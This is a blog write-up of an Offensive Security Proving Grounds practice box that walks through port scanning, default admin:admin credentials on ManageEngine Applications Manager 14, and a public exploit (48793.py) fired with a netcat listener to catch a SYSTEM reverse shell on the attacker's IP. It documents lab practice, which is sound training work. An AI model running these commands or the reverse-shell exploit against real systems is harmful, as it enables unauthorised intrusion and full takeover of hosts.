---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Performing a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV --script=smb-vuln* 192.168.62.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 11:29 EST
Nmap scan report for 192.168.62.43
Host is up (0.00052s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
12000/tcp open  cce4x?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-31T15:57:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
12000/tcp open  cce4x
22222/tcp open  easyengine
40443/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49693/tcp open  unknown
49718/tcp open  unknown
49796/tcp open  unknown
49797/tcp open  unknown

PORT      STATE SERVICE    VERSION
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

49693/tcp open  java-rmi Java RMI
49718/tcp open  unknown
49796/tcp open  unknown
49797/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49796-TCP:V=7.92%I=7%D=12/31%Time=61CF2DFE%P=x86_64-pc-linux-gnu%r(
SF:Kerberos,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(SMBProgNeg,
SF:1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(X11Probe,1A,"\0\0\0\
SF:x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,"\0\0\0\x16\0\rCLOS
SF:E_SESSION\0\x010\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49797-TCP:V=7.92%I=7%D=12/31%Time=61CF2DFE%P=x86_64-pc-linux-gnu%r(
SF:Kerberos,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(SMBProgNeg,
SF:1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(X11Probe,1A,"\0\0\0\
SF:x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,"\0\0\0\x16\0\rCLOS
SF:E_SESSION\0\x010\0\0\0\0");
```

Iterating through all these services show that on port `40443` is listening a web server.

---

# exploitation

Reviewing the web application exposes that `ManageEngine Applications Manager 14` is used.

### vulnerabilities

Looking for default credentials on `Google` shows the following.

![default credentials](/images/metallus1.png)

> `admin:admin` can be used to log in.
{: .prompt-info }

Searching for an exploit.
```bash
$ searchsploit "applications manager"
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DMXReady Secure Login Manager 1.0 - '/applications/SecureLoginManager/inc_secureloginmanager.asp?sent' SQL Injection                          | asp/webapps/29361.txt
Manage Engine Applications Manager 12 - Multiple Vulnerabilities                                                                              | multiple/webapps/39235.txt
ManageEngine Applications Manager - (Authenticated) Code Execution (Metasploit)                                                               | windows/remote/17152.rb
ManageEngine Applications Manager - Multiple Cross-Site Scripting / SQL Injections                                                            | java/webapps/37557.txt
ManageEngine Applications Manager - Multiple SQL Injections                                                                                   | java/webapps/37555.txt
ManageEngine Applications Manager 11.0 < 14.0 - SQL Injection / Remote Code Execution (Metasploit)                                            | windows/remote/46725.rb
ManageEngine Applications Manager 13 - 'MenuHandlerServlet' SQL Injection                                                                     | java/webapps/48692.py
ManageEngine Applications Manager 13 - SQL Injection                                                                                          | windows/webapps/43129.txt
ManageEngine Applications Manager 13.5 - Remote Code Execution (Metasploit)                                                                   | java/webapps/44274.rb
ManageEngine Applications Manager 14.0 - Authentication Bypass / Remote Command Execution (Metasploit)                                        | multiple/remote/46740.rb
ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)                                                               | java/webapps/48793.py
ManageEngine Applications Manager Build 12700 - Multiple Vulnerabilities                                                                      | jsp/webapps/39780.txt
ManageEngine OpManager / Applications Manager / IT360 - 'FailOverServlet' Multiple Vulnerabilities                                            | multiple/webapps/43894.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> `ManageEngine Applications Manager 14700` seems promising.
{: .prompt-info }

### exploit
#### start listener on attacker machine
```bash
$ nc -nlvp 443
```

#### fire exploit
```bash
$ python3 48793.py http://192.168.52.96:40443 admin admin 192.168.52.200 443
```

#### catch connect from target
```bash
C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```

> And we got a `nt authority\system` shell.
{: .prompt-info }

---

# post exploitation
```bash
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
7******************************2
```

Pwned! <@:-)
